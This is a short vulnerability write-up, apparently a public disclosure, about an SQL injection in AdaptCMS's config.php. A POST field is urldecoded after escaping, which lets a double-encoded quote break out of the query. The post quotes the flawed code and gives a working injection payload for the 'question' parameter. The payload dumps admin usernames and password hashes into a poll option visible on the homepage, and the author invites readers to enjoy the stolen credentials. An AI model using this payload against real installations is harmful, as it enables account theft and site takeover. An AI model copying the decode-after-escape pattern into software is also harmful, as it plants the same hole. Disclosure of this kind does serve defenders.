Introduction
============

As you know, I love fun and tricky SQL injections.
AdaptCMS is vulnerable to a really unusual one.


The vuln
========


First let's see the code :

---------------[config.php]---------------

Line 34 :
array_map('clean', $_POST);

---------------[config.php]---------------

clean() acts like addslashes.

But a couple of lines after:

---------------[config.php]---------------
ligne 111:

    mysql_query("INSERT INTO ".$pre."polls VALUES (null,
'".htmlentities(check($vote[2]))."', '".$vote2."', 'custom_option', '',
'".htmlentities(urldecode($_POST['question']))."', 1, '".time()."')");
---------------[config.php]---------------

w00t an SQL injection. $_POST['question'] is urldecoded after the
superglobal's clean. That's why we can easily inject our SQL request.
(Without ENT_QUOTES, the simple quote pass through htmlentities() ).


The PoC :
=========

Ok, now we have to add a second INSERT query, to insert a custom choice in
the poll, which obviously contain the admin creditentials.
A simple POST http request such as:
article_id=0&poll_id=1&vote=2&custom=1&question=%2527, 1, 1350677660),
(null, 0, (select concat(username, 0x3a, password) from adapt_users),
'option', '', 1, 1337, 1349597648  )-- -

Now check homepage, and enjoy the admin creditentials.

How to Fix ?
============

There is many SQL injections in this CMS ($_SERVER vars are vulnerables as
well), and others funkies vulnz.
changing your cms seems appropriate until they fix thoses issues.
